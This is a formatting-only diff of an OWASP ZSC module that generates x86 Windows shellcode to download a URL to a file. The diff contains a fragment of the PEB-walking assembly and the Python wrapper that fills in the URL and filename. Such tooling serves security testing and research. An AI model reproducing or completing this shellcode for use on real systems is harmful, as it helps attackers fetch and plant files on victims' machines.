@@ -8,8 +8,9 @@ https://groups.google.com/d/forum/owasp-zsc [ owasp-zsc[at]googlegroups[dot]com 
 '''
 from core import stack
 
+
 def download_tofile(url, filename):
-        return '''
+    return '''
 xor    %ecx,%ecx
 mov    %fs:0x30(%ecx),%eax
 mov    0xc(%eax),%eax
@@ -102,9 +103,12 @@ call   *%esi
 xor    %ecx,%ecx
 push   %ecx
 call   *%eax
-'''.format(url,filename)
+'''.format(url, filename)
+
 
 def run(data):
-   url = data[0]
-   filename = data[1]
-   return download_tofile(stack.generate(url,"%ecx","string"), stack.generate(filename,"%ecx","string"))
+    url = data[0]
+    filename = data[1]
+    return download_tofile(
+        stack.generate(url, "%ecx", "string"), stack.generate(filename, "%ecx",
+                                                              "string"))
